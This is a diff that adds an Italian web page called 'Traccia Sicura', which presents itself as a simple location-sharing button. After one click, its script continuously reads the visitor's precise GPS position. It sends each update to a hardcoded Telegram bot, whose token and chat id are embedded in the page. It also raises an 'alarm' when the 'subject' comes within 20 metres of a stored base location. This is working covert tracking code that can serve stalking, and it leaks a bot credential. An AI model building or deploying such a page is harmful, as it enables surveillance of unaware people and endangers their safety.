@@ -1,0 +1,156 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Traccia Sicura</title>
+    <meta charset="UTF-8" />
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        padding: 20px;
+        background-color: #f5f5f5;
+      }
+      #container {
+        background: white;
+        max-width: 500px;
+        margin: 0 auto;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      }
+      button {
+        background: #0088cc;
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 16px;
+        margin-top: 15px;
+      }
+      button:hover {
+        background: #006699;
+      }
+      #status {
+        margin: 15px 0;
+        padding: 10px;
+        border-radius: 5px;
+      }
+      .error {
+        background-color: #ffebee;
+        color: #c62828;
+      }
+      .success {
+        background-color: #e8f5e9;
+        color: #2e7d32;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="container">
+      <h2>Traccia Sicura</h2>
+      <p id="status">Clicca il pulsante per condividere la tua posizione</p>
+      <button id="locationBtn">Condividi Posizione</button>
+      <p id="linkContainer" style="margin-top: 15px;"></p>
+    </div>
+
+    <script>
+      const botToken = "7627218398:AAFHNujcd2e_zTluZeqfFNtJBpBuxY6pX6M";
+      const chatId = "1768737489";
+      let myLat = null;
+      let myLon = null;
+      let alertSent = false;
+
+      document.getElementById('locationBtn').addEventListener('click', () => {
+        fetch('posizione.json')
+          .then(res => res.json())
+          .then(data => {
+            myLat = data.lat;
+            myLon = data.lon;
+            startTracking();
+          })
+          .catch(() => {
+            document.getElementById('status').innerText = 'Errore nel recupero della posizione base.';
+          });
+      });
+
+      function startTracking() {
+        const statusElement = document.getElementById('status');
+        statusElement.className = '';
+        statusElement.innerText = "Tracciamento in corso...";
+
+        if (navigator.geolocation) {
+          navigator.geolocation.watchPosition(
+            (pos) => {
+              const lat = pos.coords.latitude.toFixed(6);
+              const lon = pos.coords.longitude.toFixed(6);
+              const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+              document.getElementById('linkContainer').innerHTML = `
+                <a href="${mapsUrl}" target="_blank">Visualizza la tua posizione attuale su Google Maps</a>
+              `;
+              sendToTelegram(lat, lon);
+              const distanza = getDistanceFromLatLonInMeters(myLat, myLon, parseFloat(lat), parseFloat(lon));
+              if (distanza <= 20 && !alertSent) {
+                alertSent = true;
+                sendAlertToTelegram(lat, lon, distanza);
+              }
+            },
+            (err) => {
+              statusElement.className = 'error';
+              statusElement.innerText = "Errore: " + getErrorMessage(err.code);
+            },
+            { enableHighAccuracy: true, maximumAge: 1000, timeout: 5000 }
+          );
+        } else {
+          statusElement.className = 'error';
+          statusElement.innerText = "La geolocalizzazione non è supportata dal tuo browser.";
+        }
+      }
+
+      function sendToTelegram(lat, lon) {
+        const msg = `📍 Nuova posizione rilevata:
+Latitudine: ${lat}
+Longitudine: ${lon}
+🌍 https://www.google.com/maps?q=${lat},${lon}`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: msg }),
+        });
+      }
+
+      function sendAlertToTelegram(lat, lon, distanza) {
+        const msg = `⚠️ Allarme: soggetto a ${distanza.toFixed(1)} metri!
+📍 https://www.google.com/maps?q=${lat},${lon}`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: msg }),
+        });
+      }
+
+      function getDistanceFromLatLonInMeters(lat1, lon1, lat2, lon2) {
+        const R = 6371e3;
+        const φ1 = lat1 * Math.PI / 180;
+        const φ2 = lat2 * Math.PI / 180;
+        const Δφ = (lat2 - lat1) * Math.PI / 180;
+        const Δλ = (lon2 - lon1) * Math.PI / 180;
+        const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) +
+                  Math.cos(φ1) * Math.cos(φ2) *
+                  Math.sin(Δλ/2) * Math.sin(Δλ/2);
+        const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+        return R * c;
+      }
+
+      function getErrorMessage(code) {
+        switch(code) {
+          case 1: return "Permesso negato dall'utente.";
+          case 2: return "Posizione non disponibile.";
+          case 3: return "Timeout durante il rilevamento.";
+          default: return "Errore sconosciuto.";
+        }
+      }
+    </script>
+  </body>
+</html>
